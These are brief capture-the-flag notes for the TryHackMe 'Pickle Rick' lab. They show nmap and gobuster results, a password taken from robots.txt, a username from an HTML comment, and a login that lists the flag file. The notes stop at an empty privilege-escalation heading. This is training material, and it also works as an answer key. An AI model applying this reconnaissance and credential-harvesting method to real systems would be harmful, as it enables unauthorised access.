https://tryhackme.com/room/picklerick

## scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 08:23 EDT
Nmap scan report for 10.10.222.173
Host is up (0.36s latency).
Not shown: 813 closed ports, 185 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
```

gobuster found
```
/assets/
/index.html (Status: 200)
/login.php (Status: 200)

```


## access

robots.txt

```
Wubbalubbadubdub
```

inspect source of homepage
```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

login to http://10.10.161.86/login.php with
```
R1ckRul3s:Wubbalubbadubdub
```

run ls command
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

## priv esc
